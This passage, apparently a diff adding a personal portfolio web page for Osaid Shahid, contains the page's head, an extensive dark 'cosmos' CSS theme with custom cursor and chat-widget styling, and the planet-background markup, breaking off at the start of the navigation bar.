@@ -1,1 +1,1611 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Osaid Shahid - App/Cloud Technical Support & Systems Administrator">
+    <meta name="theme-color" content="#000000">
+    <title>Osaid Shahid | Premium Technical Professional</title>
+    
+    <!-- Tailwind CSS for utility scaffolding -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Premium Google Fonts: Outfit for display, Inter for body -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Outfit:wght@300;400;500;600;800;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
 
+    <style>
+        /* ==========================================================================
+           01. ENTERPRISE DESIGN SYSTEM & CSS VARIABLES
+           ========================================================================== */
+        :root {
+            --bg-base: #000000;
+            --bg-surface: rgba(5, 5, 5, 0.85); 
+            --bg-surface-solid: #000000;
+            --bg-surface-glass: rgba(0, 0, 0, 0.9);
+            
+            --text-primary: #fafafa; 
+            --text-secondary: #a1a1aa; 
+            --text-tertiary: #71717a;
+            --text-inverse: #000000;
+            
+            --accent-primary: #ffffff;
+            --accent-indigo: #4f46e5;
+            --accent-emerald: #10b981;
+            --accent-cyan: #00e1ff;
+            --accent-purple: #bc13fe;
+            --accent-neon-green: #39FF14;
+            
+            --border-light: rgba(255, 255, 255, 0.1);
+            --border-medium: rgba(255, 255, 255, 0.2);
+            --border-glow: rgba(0, 225, 255, 0.3);
+            
+            --shadow-xs: 0 2px 10px rgba(0, 0, 0, 0.3);
+            --shadow-sm: 0 4px 20px rgba(0, 0, 0, 0.6);
+            --shadow-md: 0 10px 40px -10px rgba(0, 0, 0, 0.8);
+            --shadow-lg: 0 20px 60px -15px rgba(0, 0, 0, 0.9);
+            
+            --ease-out-expo: cubic-bezier(0.19, 1, 0.22, 1);
+            --ease-in-out-expo: cubic-bezier(0.87, 0, 0.13, 1);
+            --ease-elastic: cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            
+            --nav-height: 80px;
+            --card-radius: 24px;
+            --button-radius: 100px;
+        }
+
+        /* ==========================================================================
+           02. BASE RESET & TYPOGRAPHY SCALES
+           ========================================================================== */
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+        ::selection { background-color: var(--accent-cyan); color: var(--text-inverse); }
+        html { font-size: 16px; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-rendering: optimizeLegibility; }
+        body { background-color: var(--bg-base); color: var(--text-primary); font-family: 'Inter', sans-serif; overflow-x: hidden; width: 100%; position: relative; line-height: 1.7; }
+        h1, h2, h3, h4, h5, h6, .font-display { font-family: 'Outfit', sans-serif; letter-spacing: -0.02em; }
+        .font-mono-custom { font-family: 'JetBrains Mono', monospace; }
+
+        /* ==========================================================================
+           03. CUSTOM PHYSICS-BASED CURSOR
+           ========================================================================== */
+        @media (pointer: fine) { body, a, button, input, textarea, select { cursor: none !important; } }
+        .cursor-dot, .cursor-outline { position: fixed; top: 0; left: 0; transform: translate(-50%, -50%); border-radius: 50%; z-index: 99999; pointer-events: none; will-change: transform; }
+        .cursor-dot { width: 6px; height: 6px; background-color: var(--accent-cyan); box-shadow: 0 0 10px var(--accent-cyan); transition: opacity 0.2s ease; }
+        .cursor-outline { width: 32px; height: 32px; border: 1px solid rgba(255, 255, 255, 0.1); background-color: rgba(255, 255, 255, 0.05); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); transition: width 0.3s var(--ease-out-expo), height 0.3s var(--ease-out-expo), background-color 0.3s ease, border-color 0.3s ease; }
+        body.hovering .cursor-outline { width: 48px; height: 48px; background-color: transparent; backdrop-filter: none; -webkit-backdrop-filter: none; border-color: rgba(255, 255, 255, 0.8); border-width: 1.5px; }
+        body.hovering .cursor-dot { opacity: 0; }
+        body.clicking .cursor-outline { width: 28px; height: 28px; background-color: rgba(255, 255, 255, 0.1); border-color: var(--accent-cyan); }
+
+        /* ==========================================================================
+           04. PERPLEXITY COMET COSMOS ENGINE
+           ========================================================================== */
+        #cosmos-container { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: -3; overflow: hidden; background: #000000; pointer-events: none; }
+        .planet-noise { position: absolute; inset: 0; background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.8' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.4'/%3E%3C/svg%3E"); mix-blend-mode: overlay; border-radius: 50%; pointer-events: none; }
+        .planet-orbit { position: absolute; top: 50%; left: 50%; will-change: transform; }
+        .planet { position: absolute; border-radius: 50%; transform: translate3d(-50%, -50%, 0); box-shadow: inset -30px -30px 60px rgba(0,0,0,0.9), inset 10px 10px 40px rgba(255,255,255,0.3), 0 0 100px rgba(0,0,0,0.5); }
+
+        @keyframes spin-cw { 0% { transform: translate3d(-50%, -50%, 0) rotate(0deg); } 100% { transform: translate3d(-50%, -50%, 0) rotate(360deg); } }
+        @keyframes spin-ccw { 0% { transform: translate3d(-50%, -50%, 0) rotate(0deg); } 100% { transform: translate3d(-50%, -50%, 0) rotate(-360deg); } }
+
+        .p1 { width: 400px; height: 400px; background: radial-gradient(circle at 30% 30%, #24a19c, #ff0844 80%); left: -20vw; top: 15vh; animation: spin-cw 120s linear infinite; }
+        .p2 { width: 200px; height: 200px; background: radial-gradient(circle at 40% 20%, #f6d365, #203a43 90%); left: 35vw; top: 10vh; animation: spin-ccw 100s linear infinite; }
+        .p3 { width: 120px; height: 120px; background: radial-gradient(circle at 20% 30%, #bc13fe, #000000 70%); left: -15vw; top: 50vh; box-shadow: inset -15px -15px 30px rgba(0,0,0,0.9), inset 5px 5px 20px rgba(255,255,255,0.4); animation: spin-cw 150s linear infinite; }
+        .p5 { width: 70px; height: 70px; background: radial-gradient(circle at 30% 30%, #ffffff, #f6d365 50%, #000000 100%); left: -25vw; top: 130vh; animation: spin-cw 90s linear infinite; }
+        .p6 { width: 160px; height: 160px; background: radial-gradient(circle at 30% 30%, #ff4b1f, #1f1c2c 80%); left: 20vw; top: 200vh; box-shadow: inset -20px -20px 40px rgba(0,0,0,0.9), inset 5px 5px 20px rgba(255,255,255,0.3); animation: spin-ccw 140s linear infinite; }
+        .p7 { width: 90px; height: 90px; background: radial-gradient(circle at 40% 40%, #a1c4fd, #000000 80%); left: -10vw; top: 250vh; box-shadow: inset -10px -10px 20px rgba(0,0,0,0.9), inset 5px 5px 15px rgba(255,255,255,0.4); animation: spin-cw 110s linear infinite; }
+        .p8 { width: 250px; height: 250px; background: radial-gradient(circle at 70% 30%, #ff00cc, #330033 80%); left: -10vw; top: 170vh; box-shadow: inset -25px -25px 50px rgba(0,0,0,0.9), inset 10px 10px 30px rgba(255,255,255,0.2); animation: spin-ccw 180s linear infinite; }
+        .p9 { width: 450px; height: 450px; background: radial-gradient(circle at 20% 50%, #00b09b, #96c93d 50%, #000000 90%); left: 60vw; top: 280vh; box-shadow: inset -40px -40px 80px rgba(0,0,0,0.9), inset 10px 10px 40px rgba(255,255,255,0.2); animation: spin-cw 200s linear infinite; }
+        .p10 { width: 100px; height: 100px; background: radial-gradient(circle at 40% 40%, #ff9966, #ff5e62 70%, #000 100%); left: 85vw; top: 50vh; box-shadow: inset -10px -10px 20px rgba(0,0,0,0.9), inset 5px 5px 15px rgba(255,255,255,0.4); animation: spin-ccw 80s linear infinite; }
+        .p12 { width: 80px; height: 80px; background: radial-gradient(circle at 35% 35%, #e0ffff, #4682b4 70%, #000 100%); box-shadow: inset -8px -8px 15px rgba(0,0,0,0.9), inset 4px 4px 10px rgba(255,255,255,0.4); animation: spin-ccw 95s linear infinite; }
+        .p13 { width: 220px; height: 220px; background: radial-gradient(circle at 30% 40%, #ffd700, #ff4500 60%, #8b0000 90%); box-shadow: inset -20px -20px 40px rgba(0,0,0,0.9), inset 5px 5px 20px rgba(255,255,255,0.3); animation: spin-cw 140s linear infinite; }
+        .p14 { width: 140px; height: 140px; background: radial-gradient(circle at 40% 30%, #da70d6, #4b0082 70%, #000 100%); box-shadow: inset -15px -15px 30px rgba(0,0,0,0.9), inset 5px 5px 15px rgba(255,255,255,0.3); animation: spin-ccw 125s linear infinite; }
+        .p15 { width: 110px; height: 110px; background: radial-gradient(circle at 30% 30%, #8fbc8f, #2f4f4f 80%); box-shadow: inset -12px -12px 25px rgba(0,0,0,0.9), inset 4px 4px 12px rgba(255,255,255,0.2); animation: spin-cw 105s linear infinite; }
+        .p16 { width: 350px; height: 350px; background: radial-gradient(circle at 25% 25%, #00ced1, #00008b 60%, #000 90%); box-shadow: inset -30px -30px 60px rgba(0,0,0,0.9), inset 8px 8px 30px rgba(255,255,255,0.2); animation: spin-ccw 190s linear infinite; }
+
+        /* ==========================================================================
+           04.1 BEAUTIFUL SATURN
+           ========================================================================== */
+        .beautiful-saturn-wrapper { position: absolute; width: 600px; height: 600px; transform: translate(-50%, -50%); pointer-events: none; }
+        .bs-core { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 180px; height: 180px; border-radius: 50%; background: radial-gradient(circle at 35% 35%, #d1bc94, #c99200 40%, #8c681b 70%, #0d0802 95%); box-shadow: inset -30px -30px 45px rgba(0,0,0,0.95), inset 10px 10px 30px rgba(255,255,255,0.15), 0 0 40px rgba(248, 181, 0, 0.1); z-index: 5; overflow: hidden; }
+        .bs-core::after { content: ''; position: absolute; inset: 0; border-radius: 50%; background: repeating-linear-gradient(to bottom, rgba(255, 255, 255, 0.05) 0%, rgba(255, 255, 255, 0.05) 4%, transparent 4%, transparent 12%, rgba(0, 0, 0, 0.15) 12%, rgba(0, 0, 0, 0.15) 16%); mix-blend-mode: overlay; transform: rotate(-15deg) scale(1.2); }
+        .bs-core-shadow { position: absolute; width: 120%; height: 8px; top: 52%; left: -10%; background: rgba(0, 0, 0, 0.6); transform: rotate(-18deg); filter: blur(3px); z-index: 6; }
+        .bs-ring { position: absolute; top: 50%; left: 50%; width: 540px; height: 540px; border-radius: 50%; background: radial-gradient(circle, transparent 35%, rgba(180, 160, 120, 0.8) 35.2%, rgba(180, 160, 120, 0.8) 38%, rgba(200, 180, 140, 0.9) 38.2%, rgba(200, 180, 140, 0.9) 43%, rgba(140, 120, 90, 0.7) 43.2%, rgba(140, 120, 90, 0.7) 46%, transparent 46.2%, transparent 48%, rgba(170, 150, 110, 0.85) 48.2%, rgba(170, 150, 110, 0.85) 53%, rgba(120, 130, 150, 0.5) 53.2%, rgba(120, 130, 150, 0.5) 57%, transparent 57.2%); transform: translate(-50%, -50%) rotateX(76deg) rotateY(-18deg); }
+        .bs-ring-back { clip-path: polygon(0 0, 100% 0, 100% 50%, 0 50%); z-index: 2; }
+        .bs-ring-front { clip-path: polygon(0 50%, 100% 50%, 100% 100%, 0 100%); z-index: 10; }
+        .bs-shadow-caster { position: absolute; top: 50%; left: 50%; width: 540px; height: 540px; border-radius: 50%; background: conic-gradient(from 0deg, transparent 0deg, transparent 80deg, rgba(0,0,0,0.8) 100deg, rgba(0,0,0,0.8) 140deg, transparent 160deg, transparent 360deg); z-index: 3; clip-path: polygon(0 0, 100% 0, 100% 50%, 0 50%); transform: translate(-50%, -50%) rotateX(76deg) rotateY(-18deg); filter: blur(8px); }
+
+        #stars-1 { position: absolute; top: 0; left: 0; width: 1px; height: 1px; background: transparent; will-change: transform; pointer-events: none; }
+        #stars-2 { position: absolute; top: 0; left: 0; width: 2px; height: 2px; background: transparent; will-change: transform; pointer-events: none; }
+        #stars-3 { position: absolute; top: 0; left: 0; width: 3px; height: 3px; background: transparent; will-change: transform; pointer-events: none; box-shadow: 0 0 8px rgba(255,255,255,0.8); }
+        
+        #physics-canvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: -2; pointer-events: none; opacity: 0.7; }
+
+        /* ==========================================================================
+           06. PERPLEXITY COMET SPOTLIGHT CARDS
+           ========================================================================== */
+        .comet-cards-wrapper { position: relative; }
+        .comet-card {
+            position: relative; background-color: var(--bg-surface);
+            backdrop-filter: blur(40px); -webkit-backdrop-filter: blur(40px);
+            border-radius: var(--card-radius); padding: 2.5rem;
+            box-shadow: var(--shadow-lg); z-index: 1;
+            transition: transform 0.6s var(--ease-out-expo), box-shadow 0.6s var(--ease-out-expo);
+            height: 100%; display: flex; flex-direction: column;
+            border: 1px solid var(--border-light);
+        }
+        .comet-cards-wrapper::before { content: ''; position: absolute; inset: -2px; border-radius: calc(var(--card-radius) + 2px); background: radial-gradient(600px circle at var(--mouse-x, -1000px) var(--mouse-y, -1000px), var(--accent-cyan), transparent 40%); z-index: -1; opacity: 0; transition: opacity 0.4s ease; pointer-events: none; }
+        .comet-cards-wrapper:hover::before { opacity: 1; }
+        .comet-card:hover { transform: translateY(-8px) scale(1.02); box-shadow: var(--shadow-xl), 0 0 30px rgba(0, 225, 255, 0.1); }
+
+        /* ==========================================================================
+           07. PREMIUM COMPONENTS
+           ========================================================================== */
+        .magnetic-btn-wrapper { position: relative; display: inline-block; padding: 20px; margin: -20px; }
+        .btn-premium { position: relative; display: inline-flex; align-items: center; justify-content: center; padding: 1.25rem 2.75rem; background-color: var(--accent-primary); color: var(--text-inverse); font-family: 'Outfit', sans-serif; font-weight: 700; font-size: 1.1rem; letter-spacing: 1.5px; border-radius: var(--button-radius); text-decoration: none; overflow: hidden; transition: color 0.4s ease, box-shadow 0.4s ease; z-index: 1; border: none; box-shadow: 0 10px 30px rgba(255,255,255,0.1); }
+        .btn-premium::before { content: ''; position: absolute; bottom: 0; left: 0; width: 100%; height: 0%; background-color: var(--accent-cyan); transition: all 0.4s var(--ease-out-expo); z-index: -1; }
+        .btn-premium:hover { box-shadow: 0 15px 40px rgba(0, 225, 255, 0.3); color: black; }
+        .btn-premium:hover::before { height: 100%; }
+
+        .section-tag { display: inline-flex; align-items: center; padding: 0.6rem 1.5rem; background-color: rgba(255,255,255,0.05); border: 1px solid var(--border-light); border-radius: var(--button-radius); font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; font-weight: 700; letter-spacing: 1.5px; color: var(--text-primary); text-transform: uppercase; margin-bottom: 2.5rem; transition: transform 0.4s var(--ease-out-expo), box-shadow 0.4s ease; }
+        .section-tag:hover { transform: translateY(-3px); box-shadow: 0 8px 20px rgba(0,225,255,0.1); border-color: var(--border-medium); }
+        .section-tag::before { content: ''; display: block; width: 8px; height: 8px; background-color: var(--accent-cyan); border-radius: 50%; margin-right: 12px; box-shadow: 0 0 10px var(--accent-cyan); animation: pulse-dot 2s infinite alternate; }
+        @keyframes pulse-dot { 0% { opacity: 1; transform: scale(1); } 100% { opacity: 0.5; transform: scale(0.8); } }
+
+        /* ==========================================================================
+           08. GLASSMORPHISM NAVIGATION
+           ========================================================================== */
+        .glass-nav { background-color: var(--bg-surface-glass); backdrop-filter: blur(30px); -webkit-backdrop-filter: blur(30px); border-bottom: 1px solid var(--border-light); transition: transform 0.5s var(--ease-out-expo), background-color 0.5s ease, padding 0.5s var(--ease-out-expo); }
+        .nav-link { position: relative; color: var(--text-secondary); font-family: 'Outfit', sans-serif; font-weight: 600; font-size: 0.875rem; letter-spacing: 1px; text-transform: uppercase; transition: color 0.3s ease; padding: 0.5rem 0; }
+        .nav-link::after { content: ''; position: absolute; bottom: 0; left: 0; width: 0; height: 2px; background-color: var(--accent-cyan); transition: width 0.4s var(--ease-out-expo); }
+        .nav-link:hover { color: var(--text-primary); }
+        .nav-link:hover::after { width: 100%; box-shadow: 0 0 10px var(--accent-cyan); }
+
+        /* ==========================================================================
+           09. TIMELINES (EXPERIENCE & EXACT EDUCATION)
+           ========================================================================== */
+        .timeline-container { position: relative; padding-top: 1rem; padding-bottom: 1rem; }
+        .timeline-container::before { content: ''; position: absolute; top: 0; bottom: 0; left: 28px; width: 2px; background: linear-gradient(to bottom, transparent 0%, rgba(255,255,255,0.15) 10%, rgba(255,255,255,0.15) 90%, transparent 100%); }
+        .timeline-node { position: relative; padding-left: 6rem; margin-bottom: 5rem; }
+        .timeline-node:last-child { margin-bottom: 0; }
+        .timeline-dot { position: absolute; left: 20px; top: 2.5rem; width: 18px; height: 18px; background-color: var(--bg-base); border: 3px solid var(--text-secondary); border-radius: 50%; transition: all 0.6s var(--ease-elastic); z-index: 2; }
+        .timeline-node:hover .timeline-dot { background-color: var(--accent-cyan); border-color: var(--accent-cyan); transform: scale(1.5); box-shadow: 0 0 20px var(--accent-cyan); }
+
+        .edu-timeline-container::before { left: 50%; transform: translateX(-50%); }
+        .edu-timeline-node { width: 100%; display: flex; justify-content: flex-start; margin-bottom: 3.5rem; position: relative; }
+        .edu-timeline-node:nth-child(even) { justify-content: flex-end; }
+        .edu-timeline-content { width: 45%; position: relative; }
+        .edu-timeline-dot { position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%); width: 20px; height: 20px; background-color: var(--bg-base); border: 4px solid var(--text-secondary); border-radius: 50%; z-index: 3; transition: all 0.6s var(--ease-elastic); }
+        .edu-timeline-node:hover .edu-timeline-dot { border-color: var(--accent-purple); background-color: var(--accent-purple); transform: translate(-50%, -50%) scale(1.5); box-shadow: 0 0 20px var(--accent-purple); }
+
+        /* ==========================================================================
+           10. SCROLL REVEAL ANIMATIONS
+           ========================================================================== */
+        .reveal { opacity: 0; transform: translateY(40px); transition: opacity 1s var(--ease-out-expo), transform 1s var(--ease-out-expo); will-change: opacity; }
+        .reveal.active { opacity: 1; transform: translateY(0); }
+        .reveal-delay-1 { transition-delay: 0.1s; }
+        .reveal-delay-2 { transition-delay: 0.2s; }
+        .reveal-delay-3 { transition-delay: 0.3s; }
+        .reveal-delay-4 { transition-delay: 0.4s; }
+
+        /* ==========================================================================
+           11. CONTACT SECTION & SOCIAL CARDS
+           ========================================================================== */
+        .social-card { display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; height: 100%; text-decoration: none; }
+        .social-icon-wrapper { width: 100px; height: 100px; border-radius: 28px; background-color: rgba(255,255,255,0.05); border: 1px solid var(--border-light); display: flex; align-items: center; justify-content: center; margin-bottom: 2rem; transition: all 0.7s var(--ease-elastic); box-shadow: inset 0 0 20px rgba(255,255,255,0.02); position: relative; overflow: hidden; }
+        .social-card:hover .social-icon-wrapper { transform: translateY(-16px) scale(1.05); background-color: rgba(255,255,255,0.15); }
+        .social-card.linkedin:hover .social-icon-wrapper { border-color: rgba(0, 119, 181, 0.6); box-shadow: 0 20px 40px rgba(0, 119, 181, 0.3); }
+        .social-card.linkedin:hover .social-icon-svg { fill: #0077b5; transform: scale(1.15); filter: drop-shadow(0 0 10px rgba(0,119,181,0.5)); }
+        .social-card.gmail:hover .social-icon-wrapper { border-color: rgba(234, 67, 53, 0.6); box-shadow: 0 20px 40px rgba(234, 67, 53, 0.3); }
+        .social-card.gmail:hover .gmail-red { stroke: #ea4335; transform: scale(1.15); filter: drop-shadow(0 0 10px rgba(234,67,53,0.5)); }
+        .social-card.gmail:hover .gmail-blue { stroke: #4285f4; transform: scale(1.15); filter: drop-shadow(0 0 10px rgba(66,133,244,0.5)); }
+        .social-card.phone:hover .social-icon-wrapper { border-color: rgba(52, 168, 83, 0.6); box-shadow: 0 20px 40px rgba(52, 168, 83, 0.3); }
+        .social-card.phone:hover .phone-outline { stroke: #34a853; transform: scale(1.15) rotate(-10deg); filter: drop-shadow(0 0 10px rgba(52,168,83,0.5)); }
+        .social-icon-svg, .gmail-red, .gmail-blue, .phone-outline { transition: all 0.6s var(--ease-elastic); transform-origin: center; }
+        .social-icon-svg { width: 40px; height: 40px; fill: var(--text-primary); }
+
+        /* ==========================================================================
+           12. AI CHAT WIDGET
+           ========================================================================== */
+        #ai-chat-toggle { position: fixed; bottom: 2rem; right: 2rem; z-index: 100; padding: 1.25rem 2rem; background-color: var(--accent-primary); color: var(--text-inverse); border-radius: 100px; font-family: 'Outfit', sans-serif; font-weight: 700; font-size: 1.1rem; letter-spacing: 0.5px; display: flex; align-items: center; gap: 12px; box-shadow: 0 10px 30px rgba(255,255,255,0.1); transition: all 0.5s var(--ease-elastic); border: 1px solid rgba(255,255,255,0.2); }
+        #ai-chat-toggle:hover { transform: translateY(-8px) scale(1.05); box-shadow: 0 20px 50px rgba(0,225,255,0.3); border-color: var(--accent-cyan); color: var(--accent-cyan); background-color: #111; }
+        #ai-chat-toggle svg { animation: float-icon 3s ease-in-out infinite; }
+        @keyframes float-icon { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-4px); filter: drop-shadow(0 5px 5px rgba(0,225,255,0.5)); } }
+
+        #ai-chat-window { position: fixed; bottom: 7rem; right: 2rem; width: 420px; max-width: calc(100vw - 4rem); height: 600px; max-height: calc(100vh - 9rem); background: rgba(15, 15, 20, 0.95); backdrop-filter: blur(40px); -webkit-backdrop-filter: blur(40px); border: 1px solid var(--border-medium); border-radius: 32px; box-shadow: 0 40px 100px rgba(0,0,0,0.8), inset 0 0 30px rgba(255,255,255,0.05); z-index: 99; display: flex; flex-direction: column; overflow: hidden; opacity: 0; pointer-events: none; transform: translateY(40px) scale(0.9); transform-origin: bottom right; transition: all 0.6s var(--ease-out-expo); }
+        #ai-chat-window.active { opacity: 1; pointer-events: auto; transform: translateY(0) scale(1); }
+        .chat-header { padding: 1.75rem; border-bottom: 1px solid var(--border-light); display: flex; justify-content: space-between; align-items: center; background: rgba(0, 0, 0, 0.4); }
+        .chat-messages { flex: 1; padding: 1.75rem; overflow-y: auto; display: flex; flex-direction: column; gap: 1.25rem; scroll-behavior: smooth; }
+        .chat-message { max-width: 85%; padding: 1.1rem 1.4rem; border-radius: 20px; font-size: 0.95rem; line-height: 1.6; animation: messageSlide 0.5s var(--ease-out-expo) forwards; opacity: 0; transform: translateY(15px); }
+        @keyframes messageSlide { to { opacity: 1; transform: translateY(0); } }
+        .message-ai { background-color: rgba(255,255,255,0.08); border: 1px solid var(--border-light); color: var(--text-primary); align-self: flex-start; border-bottom-left-radius: 6px; }
+        .message-user { background-color: var(--accent-cyan); color: #000; align-self: flex-end; border-bottom-right-radius: 6px; font-weight: 600; }
+        .chat-input-area { padding: 1.5rem; border-top: 1px solid var(--border-light); background: rgba(0, 0, 0, 0.4); display: flex; gap: 1rem; }
+        .chat-input { flex: 1; padding: 1rem 1.5rem; border: 1px solid var(--border-medium); border-radius: 100px; background: rgba(0,0,0,0.5); color: white; font-family: 'Inter', sans-serif; font-size: 0.95rem; outline: none; transition: all 0.3s ease; }
+        .chat-input:focus { border-color: var(--accent-cyan); box-shadow: 0 0 0 4px rgba(0, 225, 255, 0.15); }
+        .chat-send-btn { width: 52px; height: 52px; border-radius: 50%; background-color: var(--accent-cyan); color: #000; border: none; display: flex; align-items: center; justify-content: center; transition: transform 0.3s var(--ease-elastic), box-shadow 0.2s ease; }
+        .chat-send-btn:hover { transform: scale(1.15); box-shadow: 0 0 20px var(--accent-cyan); }
+        .typing-dots { display: flex; gap: 6px; padding: 0.5rem; }
+        .typing-dots span { width: 8px; height: 8px; background-color: var(--accent-cyan); border-radius: 50%; animation: typing 1.4s infinite ease-in-out both; }
+        .typing-dots span:nth-child(1) { animation-delay: -0.32s; }
+        .typing-dots span:nth-child(2) { animation-delay: -0.16s; }
+
+        /* ==========================================================================
+           13. RESPONSIVE MEDIA QUERIES & MOBILE OPTIMIZATIONS
+           ========================================================================== */
+        @media (max-width: 1024px) {
+            .edu-timeline-container::before { left: 24px; transform: none; }
+            .edu-timeline-node { flex-direction: column; padding-left: 5rem; margin-bottom: 4rem; }
+            .edu-timeline-node:nth-child(even) { justify-content: flex-start; }
+            .edu-timeline-content { width: 100%; }
+            .edu-timeline-dot { left: 16px; top: 1.5rem; transform: none; }
+            .edu-timeline-node:hover .edu-timeline-dot { transform: scale(1.4); }
+        }
+
+        @media (max-width: 768px) {
+            html { font-size: 14px; }
+            .comet-card { padding: 1.5rem; border-radius: 20px; backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); background-color: rgba(12, 12, 15, 0.96); }
+            .planet-noise { display: none !important; }
+            .bs-shadow-caster { display: none !important; }
+            .beautiful-saturn-wrapper { box-shadow: none !important; filter: none !important; }
+            .char-inner { filter: none !important; text-shadow: none !important; drop-shadow: none !important; }
+            .bot-glow { animation: none !important; filter: none !important; }
+            .tractor-beam { box-shadow: none !important; }
+            .planet-orbit { will-change: auto; }
+            .timeline-container::before { left: 16px; }
+            .timeline-node { padding-left: 3.5rem; margin-bottom: 3.5rem; }
+            .timeline-dot { left: 8px; width: 18px; height: 18px; top: 1.5rem; }
+            .hero-title { font-size: 3.5rem !important; line-height: 1.1 !important; }
+            .cursor-dot, .cursor-outline { display: none; }
+            body { cursor: auto; }
+            .btn-premium, .hover-trigger, a, button { cursor: pointer; }
+            #ai-chat-window { bottom: 0; right: 0; width: 100vw; height: 85vh; max-width: none; max-height: none; border-radius: 32px 32px 0 0; transform: translateY(100%); }
+            #ai-chat-toggle { bottom: 1.5rem; right: 1.5rem; padding: 1rem 1.5rem; font-size: 0.9rem; }
+        }
+
+        /* Physics Text Setup */
+        .char-wrapper { display: inline-block; white-space: pre; position: relative; }
+        .char-inner { display: inline-block; position: relative; z-index: 10; }
+        .char-inner.falling { z-index: 5; pointer-events: none; }
+        .char-inner.carried { z-index: 20; pointer-events: none; filter: drop-shadow(0 0 10px rgba(0,225,255,0.8)); }
+        
+        #fixer-bot { position: absolute; width: 40px; height: 40px; z-index: 60; pointer-events: none; transform: translate(-100px, -100px); }
+        .tractor-beam { position: absolute; left: 50%; top: 50%; width: 2px; background: linear-gradient(to bottom, #00e1ff, transparent); transform-origin: top center; opacity: 0; box-shadow: 0 0 10px #00e1ff; pointer-events: none; z-index: -1; }
+        .bot-glow { animation: pulseGlow 2s infinite alternate; }
+        @keyframes pulseGlow { 0% { filter: drop-shadow(0 0 5px rgba(0,225,255,0.5)); } 100% { filter: drop-shadow(0 0 15px rgba(0,225,255,1)); } }
+        @keyframes float-saturn { 0%, 100% { transform: translateY(0px) rotate(0deg); } 50% { transform: translateY(-30px) rotate(1deg); } }
+
+    </style>
+</head>
+<body>
+
+    <!-- Premium Backgrounds (Cosmos) -->
+    <div id="cosmos-container">
+        <!-- Orbiting Planets -->
+        <div class="planet-orbit" style="top: 20vh; left: 10vw;" data-speed="-0.2" data-rot="0.08"><div class="planet p1"><div class="planet-noise"></div></div></div>
+        <div class="planet-orbit" style="top: 40vh; left: 25vw;" data-speed="-0.1" data-rot="-0.1"><div class="planet p12"><div class="planet-noise"></div></div></div>
+        <div class="planet-orbit" style="top: 80vh; left: 85vw;" data-speed="-0.3" data-rot="0.15"><div class="planet p10"><div class="planet-noise"></div></div></div>
+        <div class="planet-orbit" style="top: 120vh; left: 80vw;" data-speed="-0.2" data-rot="-0.08"><div class="planet p2"><div class="planet-noise"></div></div></div>
+        <div class="planet-orbit" style="top: 160vh; left: 15vw;" data-speed="-0.4" data-rot="0.12"><div class="planet p13"><div class="planet-noise"></div></div></div>
+        <div class="planet-orbit" style="top: 200vh; left: 85vw;" data-speed="-0.3" data-rot="0.09"><div class="planet p3"><div class="planet-noise"></div></div></div>
+        <div class="planet-orbit" style="top: 240vh; left: 10vw;" data-speed="-0.2" data-rot="0.11"><div class="planet p7"><div class="planet-noise"></div></div></div>
+        <div class="planet-orbit" style="top: 320vh; left: 80vw;" data-speed="-0.3" data-rot="0.13"><div class="planet p14"><div class="planet-noise"></div></div></div>
+        <div class="planet-orbit" style="top: 360vh; left: -5vw;" data-speed="-0.5" data-rot="-0.09"><div class="planet p8"><div class="planet-noise"></div></div></div>
+        <div class="planet-orbit" style="top: 400vh; left: 20vw;" data-speed="-0.3" data-rot="0.14"><div class="planet p5"><div class="planet-noise"></div></div></div>
+        <div class="planet-orbit" style="top: 440vh; left: 70vw;" data-speed="-0.4" data-rot="-0.11"><div class="planet p15"><div class="planet-noise"></div></div></div>
+        
+        <!-- NEW: Planets Below Saturn for Expertise & Contact Sections -->
+        <div class="planet-orbit" style="top: 520vh; left: 85vw;" data-speed="-0.4" data-rot="-0.12"><div class="planet p6"><div class="planet-noise"></div></div></div>
+        <div class="planet-orbit" style="top: 600vh; left: 15vw;" data-speed="-0.3" data-rot="0.08"><div class="planet p9"><div class="planet-noise"></div></div></div>
+        <div class="planet-orbit" style="top: 680vh; left: 75vw;" data-speed="-0.5" data-rot="-0.10"><div class="planet p12"><div class="planet-noise"></div></div></div>
+        <div class="planet-orbit" style="top: 760vh; left: 25vw;" data-speed="-0.6" data-rot="0.15"><div class="planet p16"><div class="planet-noise"></div></div></div>
+        <div class="planet-orbit" style="top: 830vh; left: 80vw;" data-speed="-0.4" data-rot="-0.09"><div class="planet p14"><div class="planet-noise"></div></div></div>
+
+        <!-- Starfield generated via JS -->
+        <div id="stars-1"></div><div id="stars-2"></div><div id="stars-3"></div>
+    </div>
+    
+    <canvas id="physics-canvas"></canvas>
+    <div class="cursor-dot" id="cursor-dot"></div>
+    <div class="cursor-outline" id="cursor-outline"></div>
+
+    <!-- ==========================================================================
+         NAVIGATION
+         ========================================================================== -->
+    <nav class="fixed top-0 w-full z-50 px-6 py-5 glass-nav" id="navbar">
+        <div class="max-w-[1400px] mx-auto flex justify-between items-center">
+            <div class="font-display text-3xl font-black tracking-tight text-primary cursor-pointer hover-trigger">
+                Osaid<span class="text-accent-cyan" style="color:var(--accent-cyan)"> Shahid</span>
+            </div>
+            <div class="hidden md:flex gap-12">
